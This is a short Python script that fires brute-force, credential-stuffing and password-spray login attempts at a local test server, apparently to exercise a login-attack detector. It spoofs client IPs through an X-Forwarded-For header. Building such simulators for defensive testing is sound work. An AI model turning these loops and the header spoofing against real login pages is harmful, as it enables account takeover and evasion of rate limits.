# simulate_engine.py
import requests
import time

def simulate(attack_type, usernames, passwords, ip, count):
    url = "http://localhost:5000/login"
    headers = {"X-Forwarded-For": ip}

    if attack_type == "bruteforce":
        # on a single user try multiple passwords
        target_user = usernames[0]
        for pwd in passwords:
            for _ in range(count):
                try:
                    requests.post(url, data={"username": target_user, "password": pwd}, headers=headers, timeout=5)
                except Exception:
                    pass

    elif attack_type == "stuffing":
        same_password = passwords[0]
        for user in usernames:
            for _ in range(count):
                try:
                    requests.post(url, data={"username": user, "password": same_password}, headers=headers, timeout=5)
                except Exception:
                    pass

    elif attack_type == "spray":
        password = passwords[0]
        for user in usernames:
            try:
                requests.post(url, data={"username": user, "password": password}, headers=headers, timeout=5)
            except Exception:
                pass
            time.sleep(1)  # spraying is slow by design
